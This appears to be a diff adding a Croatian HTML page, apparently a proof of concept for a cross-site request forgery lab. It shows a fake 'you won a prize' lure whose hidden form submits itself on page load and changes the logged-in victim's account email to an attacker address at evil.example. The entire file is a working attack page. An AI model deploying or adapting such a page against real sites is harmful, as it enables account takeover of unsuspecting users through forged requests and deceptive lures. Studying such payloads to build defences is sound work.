@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="hr">
+<head>
+  <meta charset="utf-8">
+  <title>Nagradna igra</title>
+</head>
+<body>
+  <h1>Čestitamo, osvojili ste nagradu!</h1>
+  <p>Pričekajte trenutak, preuzimamo vašu nagradu...</p>
+
+  <!-- Skrivena forma: salje zahtjev za promjenu e-maila u ime prijavljenog korisnika, BEZ CSRF tokena. -->
+  <form id="napad" method="post" action="/csrf/email">
+    <input type="hidden" name="email" value="napadac@evil.example">
+    <button type="submit">Preuzmi nagradu</button>
+  </form>
+
+  <script>
+    document.getElementById('napad').submit();
+  </script>
+</body>
+</html>
